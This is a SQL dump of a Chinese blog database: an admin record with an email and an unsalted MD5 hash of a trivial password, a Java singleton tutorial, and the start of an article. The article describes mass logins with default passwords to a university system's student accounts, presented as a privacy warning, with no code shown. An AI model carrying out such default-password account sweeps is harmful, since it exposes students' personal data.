-- ----------------------------
-- Records of admin_user
-- ----------------------------
INSERT INTO `admin_user` VALUES ('1', 'admin', 'e10adc3949ba59abbe56e057f20f883e', '1996-11-20', '摆码王子', 'zhengbaole_1996@163.com', 'http://github.com/JamesZBL', '1146556298', null, 'Programming', null, null, '', '2017-12-04 13:07:32', '2017-12-04 13:07:32');

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES ('23', '面向对象软件设计模式（一）- 单例模式', '面向对象软件设计模式中的经典模式-单例模式', '<div class=\"markdown-body editormd-preview-container\" previewcontainer=\"true\" style=\"padding: 20px;\"><h2 id=\"h2-u524Du8A00\"><a name=\"前言\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>前言</h2><p>单例(Singleton)应该是开发者们最熟悉的设计模式了，并且好像也是最容易实现的——基本上每个开发者都能够随手写出——但是，真的是这样吗？<br>作为一个Java开发者，也许你觉得自己对单例模式的了解已经足够多了。我并不想危言耸听说一定还有你不知道的——毕竟我自己的了解也的确有限，但究竟你自己了解的程度到底怎样呢？往下看，我们一起来聊聊看~</p>\r\n<h2 id=\"h2--\"><a name=\"什么是单例？\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>什么是单例？</h2><p>单例对象的类必须保证只有一个实例存在——这是维基百科上对单例的定义，这也可以作为对意图实现单例模式的代码进行检验的标准。</p>\r\n<blockquote>\r\n<ul>\r\n<li>保证一个类仅有一个实例， 并提供一个访问它的全局访问点。让类自身负责保存它的唯一实例。</li><li>这个类可以保证没有其他实例可以被创建（通过截取创建新对象的请求 ）， 并且它可以提供一个访问该实例的方法</li></ul>\r\n</blockquote>\r\n<h2 id=\"h2-u5B9Eu4F8B\"><a name=\"实例\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>实例</h2><blockquote>\r\n<p>在一部电影中，导演的作用是至关重要的，通常一部电影只有一个总导演。在电影的拍摄过程中，可能会设计多个片场，导演需要对不同的演员进行分别指导，但所有演员导演都是同一个人，“把导演叫过来” 这个过程可以视为单例模式获取实例的过程</p>\r\n</blockquote>\r\n<h2 id=\"h2-u6A21u5F0Fu5206u6790\"><a name=\"模式分析\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>模式分析</h2><blockquote>\r\n<p>先来看最简单的写法</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">Single</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Single</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Single</span><span class=\"pln\"> getInstance</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L4\"><code><span class=\"pln\">            instance </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">new</span><span class=\"pln\"> </span><span class=\"typ\">Single</span><span class=\"pun\">();</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"pun\">}</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">return</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L7\"><code><span class=\"pln\">    </span><span class=\"pun\">}</span></code></li><li class=\"L8\"><code><span class=\"pun\">}</span></code></li></ol></pre><blockquote>\r\n<p>稍作修改，把构造器改为私有的，防止被外部的类调用</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{}</span></code></li><li class=\"L3\"><code><span class=\"pln\">    </span><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> getInstance</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L5\"><code><span class=\"pln\">            instance </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">new</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">();</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"pun\">}</span></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"kwd\">return</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L8\"><code><span class=\"pln\">    </span><span class=\"pun\">}</span></code></li><li class=\"L9\"><code><span class=\"pun\">}</span></code></li></ol></pre><blockquote>\r\n<p>每次获取实例对象之前先进行判空，如果对象为 null 则实例化一个 instance，如果存在则直接返回该实例。这种方法表面上看是完美的，仿佛实例只存在一个。但是，在多线程运行的时候，如果两个不同的线程同时运行到判空操作，会各自分别创建一个实例，这样一来，这种方法就不是单例了</p>\r\n<p>在 getInstance() 方法上添加 synchronized 关键字</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{}</span></code></li><li class=\"L3\"><code><span class=\"pln\">    </span><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"kwd\">synchronized</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> getInstance</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L5\"><code><span class=\"pln\">            instance </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">new</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">();</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"pun\">}</span></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"kwd\">return</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L8\"><code><span class=\"pln\">    </span><span class=\"pun\">}</span></code></li><li class=\"L9\"><code><span class=\"pun\">}</span></code></li></ol></pre><blockquote>\r\n<p>这样写保证了 getInstance 方法同一时刻只会有一个线程执行，但是这样做会使得除了执行这个方法的线程顺利执行外，其他所有线程都要等待，这会造成极大的系统开销，降低了程序的运行效率</p>\r\n<p>这种方法代价过高，因为无论 instance 是否为 null ,每次执行时，整个方法都加上了锁，我们不妨将锁的范围尽可能的缩小，把对性能的影响降到最低，于是有了如下写法</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{}</span></code></li><li class=\"L3\"><code><span class=\"pln\">    </span><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> getInstance</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L5\"><code><span class=\"pln\">            </span><span class=\"kwd\">synchronized</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"typ\">Singleton</span><span class=\"pun\">.</span><span class=\"kwd\">class</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L6\"><code><span class=\"pln\">                </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L7\"><code><span class=\"pln\">                    instance </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">new</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">();</span></code></li><li class=\"L8\"><code><span class=\"pln\">                </span><span class=\"pun\">}</span></code></li><li class=\"L9\"><code><span class=\"pln\">            </span><span class=\"pun\">}</span></code></li><li class=\"L0\"><code><span class=\"pln\">        </span><span class=\"pun\">}</span></code></li><li class=\"L1\"><code><span class=\"pln\">        </span><span class=\"kwd\">return</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"pun\">}</span></code></li><li class=\"L3\"><code><span class=\"pun\">}</span></code></li></ol></pre><blockquote>\r\n<p>只有当 instance 为 null 的时候才执行同步代码块，二次判空保证了不会产生多个实例</p>\r\n<p>这样看似没问题了，但是在计算机中，有时为了提高运行效率，会对指令进行重拍，比如</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">int</span><span class=\"pln\"> a</span><span class=\"pun\">;</span><span class=\"pln\">      </span><span class=\"com\">//语句 A</span></code></li><li class=\"L1\"><code><span class=\"pln\">a </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"lit\">3</span><span class=\"pun\">;</span><span class=\"pln\">      </span><span class=\"com\">//语句 B</span></code></li><li class=\"L2\"><code><span class=\"kwd\">int</span><span class=\"pln\"> b </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"lit\">5</span><span class=\"pun\">;</span><span class=\"pln\">      </span><span class=\"com\">//语句 C</span></code></li><li class=\"L3\"><code><span class=\"kwd\">int</span><span class=\"pln\"> c </span><span class=\"pun\">=</span><span class=\"pln\"> a </span><span class=\"pun\">+</span><span class=\"pln\"> b</span><span class=\"pun\">;</span><span class=\"pln\">  </span><span class=\"com\">//语句 D</span></code></li></ol></pre><blockquote>\r\n<p>可能会被重排成 A-C-B-D 或者 C-A-B-D</p>\r\n<p>语句 C 和语句 D 不具备原子性，因此也有可能被重排<br>getInstance 操作如果被重排，那么 instance 会存在一种 “不为 null 但是仍然未被初始化” 的状态，即已经给 instance 分配了内存空间但是并没有调用 Singleton 的构造方法来初始化 instance，执行判空的线程抢在了初始化的操作完成之前，则直接返回 instance 肯定会报错</p>\r\n<p>于是有了最终版本，添加 volatile 关键字</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"kwd\">volatile</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">private</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{}</span></code></li><li class=\"L3\"><code><span class=\"pln\">    </span><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">static</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> getInstance</span><span class=\"pun\">()</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L5\"><code><span class=\"pln\">            </span><span class=\"kwd\">synchronized</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"typ\">Singleton</span><span class=\"pun\">.</span><span class=\"kwd\">class</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L6\"><code><span class=\"pln\">                </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"pun\">(</span><span class=\"pln\">instance </span><span class=\"pun\">==</span><span class=\"pln\"> </span><span class=\"kwd\">null</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L7\"><code><span class=\"pln\">                    instance </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">new</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">();</span></code></li><li class=\"L8\"><code><span class=\"pln\">                </span><span class=\"pun\">}</span></code></li><li class=\"L9\"><code><span class=\"pln\">            </span><span class=\"pun\">}</span></code></li><li class=\"L0\"><code><span class=\"pln\">        </span><span class=\"pun\">}</span></code></li><li class=\"L1\"><code><span class=\"pln\">        </span><span class=\"kwd\">return</span><span class=\"pln\"> instance</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"pun\">}</span></code></li><li class=\"L3\"><code><span class=\"pun\">}</span></code></li></ol></pre><blockquote>\r\n<p>volatile 关键字具有屏蔽指令重排的功能，即对 instance 加上了一把锁，在完成写操作之前不会允许其他线程进行读操作，因此，在初始化完成前，无法对其进行读操作</p>\r\n<p>枚举类型是线程安全的，因此采用枚举类作为单例模式的一种实现是非常方便的</p>\r\n</blockquote>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">public</span><span class=\"pln\"> </span><span class=\"kwd\">enum</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pln\"> </span><span class=\"pun\">{</span></code></li><li class=\"L1\"><code><span class=\"pln\">    INSTANCE</span><span class=\"pun\">;</span></code></li><li class=\"L2\"><code><span class=\"pun\">}</span></code></li></ol></pre><blockquote>\r\n<p>通过枚举类获取单例的实例</p>\r\n<pre class=\"prettyprint linenums prettyprinted\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"typ\">Singleton</span><span class=\"pln\"> result </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Singleton</span><span class=\"pun\">.</span><span class=\"pln\">INSTANCE</span><span class=\"pun\">;</span></code></li></ol></pre></blockquote>\r\n<h3 id=\"h3--\"><a name=\"知识点：什么时候是类装载时？\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>知识点：什么时候是类装载时？</h3><blockquote>\r\n<p>前面提到了单例在类装载时被实例化，那究竟什么时候才是『类装载时』呢？</p>\r\n<p>不严格的说，大致有这么几个条件会触发一个类被加载：</p>\r\n<ol>\r\n<li>new一个对象时</li><li>使用反射创建它的实例时</li><li>子类被加载时，如果父类还没被加载，就先加载父类</li><li>jvm启动时执行的主类会首先被加载</li></ol>\r\n</blockquote>\r\n<h2 id=\"h2-u9002u7528u573Au666F\"><a name=\"适用场景\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>适用场景</h2><blockquote>\r\n<ul>\r\n<li>类只能有一个实例而且客户可以从一个众所周知的访问点访问它</li><li>这个唯一实例应该是通过子类化可扩展的， 并且客户应该无需更改代码就能使用一个扩展的实例</li></ul>\r\n</blockquote>\r\n<h2 id=\"h2-u603Bu7ED3\"><a name=\"总结\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>总结</h2><p>OK，看到这里，你还会觉得单例模式是最简单的设计模式了么？再回头看一下你之前代码中的单例实现，觉得是无懈可击的么？<br>可能我们在实际的开发中，对单例的实现并没有那么严格的要求。比如，我如果能保证所有的getInstance都是在一个线程的话，那其实第一种最简单的教科书方式就够用了。再比如，有时候，我的单例变成了多例也可能对程序没什么太大影响……<br>但是，如果我们能了解更多其中的细节，那么如果哪天程序出了些问题，我们起码能多一个排查问题的点。早点解决问题，就能早点回家吃饭……:-D</p>\r\n<p>—— 还有，完美的方案是不存在，任何方式都会有一个『度』的问题。比如，你的觉得代码已经无懈可击了，但是因为你用的是JAVA语言，可能ClassLoader有些BUG啊……你的代码谁运行在JVM上的，可能JVM本身有BUG啊……你的代码运行在手机上，可能手机系统有问题啊……你生活在这个宇宙里，可能宇宙本身有些BUG啊……o(╯□╰)o<br>所以，尽力做到能做到的最好就行了。</p>\r\n<p>—— 感谢你花费了不少时间看到这里，但愿你没有觉得虚度。</p>\r\n<h2 id=\"h2-u5F00u6E90u9879u76EE\"><a name=\"开源项目\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>开源项目</h2><p>本人创建的关于各种设计模式的开源项目：<a href=\"https://github.com/JamesZBL/java_design_patterns\">Java 实现的面向对象软件设计模式</a>  ，如果觉得有用，欢迎 Star/Fork/提Issue。该项目目前处在开发阶段。</p>\r\n<p>原文链接：<a href=\"https://zhuanlan.zhihu.com/p/31007589\">Hi，我们再来聊一聊Java的单例吧</a></p>\r\n</div>', '## 前言\r\n单例(Singleton)应该是开发者们最熟悉的设计模式了，并且好像也是最容易实现的——基本上每个开发者都能够随手写出——但是，真的是这样吗？\r\n作为一个Java开发者，也许你觉得自己对单例模式的了解已经足够多了。我并不想危言耸听说一定还有你不知道的——毕竟我自己的了解也的确有限，但究竟你自己了解的程度到底怎样呢？往下看，我们一起来聊聊看~\r\n\r\n## 什么是单例？\r\n单例对象的类必须保证只有一个实例存在——这是维基百科上对单例的定义，这也可以作为对意图实现单例模式的代码进行检验的标准。\r\n>* 保证一个类仅有一个实例， 并提供一个访问它的全局访问点。让类自身负责保存它的唯一实例。\r\n>* 这个类可以保证没有其他实例可以被创建（通过截取创建新对象的请求 ）， 并且它可以提供一个访问该实例的方法\r\n\r\n## 实例\r\n\r\n> 在一部电影中，导演的作用是至关重要的，通常一部电影只有一个总导演。在电影的拍摄过程中，可能会设计多个片场，导演需要对不同的演员进行分别指导，但所有演员导演都是同一个人，“把导演叫过来” 这个过程可以视为单例模式获取实例的过程\r\n\r\n## 模式分析\r\n\r\n> 先来看最简单的写法\r\n\r\n```\r\npublic class Single {\r\n    private static Single instance;\r\n    public static Single getInstance() {\r\n        if (instance == null) {\r\n            instance = new Single();\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n\r\n> 稍作修改，把构造器改为私有的，防止被外部的类调用\r\n\r\n```\r\npublic class Singleton {\r\n    private static Singleton instance;\r\n    private Singleton() {}\r\n    public static Singleton getInstance() {\r\n        if (instance == null) {\r\n            instance = new Singleton();\r\n        }\r\n        return instance;\r\n    }\r\n}\r\n```\r\n\r\n> 每次获取实例对象之前先进行判空，如果对象为 null 则实例化一个 instance，如果存在则直接返回该实例。这种方法表面上看是完美的，仿佛实例只存在一个。但是，在多线程运行的时候，如果两个不同的线程同时运行到判空操作，会各自分别创建一个实例，这样一来，这种方法就不是单例了\r\n\r\n> 在 getInstance() 方法上添加 synchronized 关键字\r\n\r\n```\r\npublic class Singleton {\r\n    private static Singleton instance;\r\n    private Singleton() {}\r\n    public static synchronized Singleton getInstance() {\r\n        if (instance == null) {\r\n            instance = new Singleton();\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n> 这样写保证了 getInstance 方法同一时刻只会有一个线程执行，但是这样做会使得除了执行这个方法的线程顺利执行外，其他所有线程都要等待，这会造成极大的系统开销，降低了程序的运行效率\r\n\r\n> 这种方法代价过高，因为无论 instance 是否为 null ,每次执行时，整个方法都加上了锁，我们不妨将锁的范围尽可能的缩小，把对性能的影响降到最低，于是有了如下写法\r\n\r\n```\r\npublic class Singleton {\r\n    private static Singleton instance;\r\n    private Singleton() {}\r\n    public static Singleton getInstance() {\r\n        if (instance == null) {\r\n            synchronized (Singleton.class) {\r\n                if (instance == null) {\r\n                    instance = new Singleton();\r\n                }\r\n            }\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n> 只有当 instance 为 null 的时候才执行同步代码块，二次判空保证了不会产生多个实例\r\n\r\n> 这样看似没问题了，但是在计算机中，有时为了提高运行效率，会对指令进行重拍，比如\r\n\r\n```\r\nint a;      //语句 A\r\na = 3;      //语句 B\r\nint b = 5;      //语句 C\r\nint c = a + b;  //语句 D\r\n```\r\n> 可能会被重排成 A-C-B-D 或者 C-A-B-D\r\n>\r\n> 语句 C 和语句 D 不具备原子性，因此也有可能被重排\r\n> getInstance 操作如果被重排，那么 instance 会存在一种 “不为 null 但是仍然未被初始化” 的状态，即已经给 instance 分配了内存空间但是并没有调用 Singleton 的构造方法来初始化 instance，执行判空的线程抢在了初始化的操作完成之前，则直接返回 instance 肯定会报错\r\n> \r\n> 于是有了最终版本，添加 volatile 关键字\r\n\r\n```\r\npublic class Singleton {\r\n    private static volatile Singleton instance;\r\n    private Singleton() {}\r\n    public static Singleton getInstance() {\r\n        if (instance == null) {\r\n            synchronized (Singleton.class) {\r\n                if (instance == null) {\r\n                    instance = new Singleton();\r\n                }\r\n            }\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n> volatile 关键字具有屏蔽指令重排的功能，即对 instance 加上了一把锁，在完成写操作之前不会允许其他线程进行读操作，因此，在初始化完成前，无法对其进行读操作\r\n\r\n> 枚举类型是线程安全的，因此采用枚举类作为单例模式的一种实现是非常方便的\r\n\r\n```\r\npublic enum Singleton {\r\n    INSTANCE;\r\n}\r\n```\r\n\r\n> 通过枚举类获取单例的实例\r\n```\r\nSingleton result = Singleton.INSTANCE;\r\n```\r\n\r\n### 知识点：什么时候是类装载时？\r\n\r\n> 前面提到了单例在类装载时被实例化，那究竟什么时候才是『类装载时』呢？\r\n\r\n> 不严格的说，大致有这么几个条件会触发一个类被加载：\r\n> 1. new一个对象时\r\n> 2. 使用反射创建它的实例时\r\n> 3. 子类被加载时，如果父类还没被加载，就先加载父类\r\n> 4. jvm启动时执行的主类会首先被加载\r\n\r\n## 适用场景\r\n\r\n>* 类只能有一个实例而且客户可以从一个众所周知的访问点访问它\r\n>* 这个唯一实例应该是通过子类化可扩展的， 并且客户应该无需更改代码就能使用一个扩展的实例\r\n\r\n## 总结\r\nOK，看到这里，你还会觉得单例模式是最简单的设计模式了么？再回头看一下你之前代码中的单例实现，觉得是无懈可击的么？\r\n可能我们在实际的开发中，对单例的实现并没有那么严格的要求。比如，我如果能保证所有的getInstance都是在一个线程的话，那其实第一种最简单的教科书方式就够用了。再比如，有时候，我的单例变成了多例也可能对程序没什么太大影响……\r\n但是，如果我们能了解更多其中的细节，那么如果哪天程序出了些问题，我们起码能多一个排查问题的点。早点解决问题，就能早点回家吃饭……:-D\r\n\r\n—— 还有，完美的方案是不存在，任何方式都会有一个『度』的问题。比如，你的觉得代码已经无懈可击了，但是因为你用的是JAVA语言，可能ClassLoader有些BUG啊……你的代码谁运行在JVM上的，可能JVM本身有BUG啊……你的代码运行在手机上，可能手机系统有问题啊……你生活在这个宇宙里，可能宇宙本身有些BUG啊……o(╯□╰)o\r\n所以，尽力做到能做到的最好就行了。\r\n\r\n—— 感谢你花费了不少时间看到这里，但愿你没有觉得虚度。\r\n\r\n\r\n## 开源项目\r\n本人创建的关于各种设计模式的开源项目：[Java 实现的面向对象软件设计模式](https://github.com/JamesZBL/java_design_patterns)  ，如果觉得有用，欢迎 Star/Fork/提Issue。该项目目前处在开发阶段。\r\n\r\n原文链接：[Hi，我们再来聊一聊Java的单例吧](https://zhuanlan.zhihu.com/p/31007589)', '2017-12-09 18:07:40', '2017-12-09 18:07:40');
INSERT INTO `article` VALUES ('24', 'Python 爬虫获取 URP 教务系统学籍信息', '你的个人信息正暴露在互联网中！Python 爬虫获取 URP 教务系统学籍信息', '<div class=\"markdown-body editormd-preview-container\" previewcontainer=\"true\" style=\"padding: 20px;\"><h2 id=\"h2-u521Du8877\"><a name=\"初衷\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>初衷</h2><p><strong>本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！</strong></p>\r\n<p>作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，<strong>个人信息泄露情况非常严重！</strong></p>\r\n<h2 id=\"h2-u7ED3u679C\"><a name=\"结果\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>结果</h2><p>先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：</p>\r\n<table>\r\n<thead>\r\n<tr>\r\n<th style=\"text-align:center\">序号</th>\r\n<th style=\"text-align:center\">学院</th>\r\n<th style=\"text-align:center\">年级</th>\r\n<th style=\"text-align:center\">在网账号</th>\r\n<th style=\"text-align:center\">可爬账号</th>\r\n<th style=\"text-align:center\">年级占比</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr>\r\n<td style=\"text-align:center\">1</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2014</td>\r\n<td style=\"text-align:center\">3157</td>\r\n<td style=\"text-align:center\">1998</td>\r\n<td style=\"text-align:center\">63.29%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">2</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2015</td>\r\n<td style=\"text-align:center\">3328</td>\r\n<td style=\"text-align:center\">2234</td>\r\n<td style=\"text-align:center\">67.13%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">3</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2016</td>\r\n<td style=\"text-align:center\">3641</td>\r\n<td style=\"text-align:center\">3066</td>\r\n<td style=\"text-align:center\">84.21%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">4</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2017</td>\r\n<td style=\"text-align:center\">3497</td>\r\n<td style=\"text-align:center\">3326</td>\r\n<td style=\"text-align:center\">95.11%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">5</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2014</td>\r\n<td 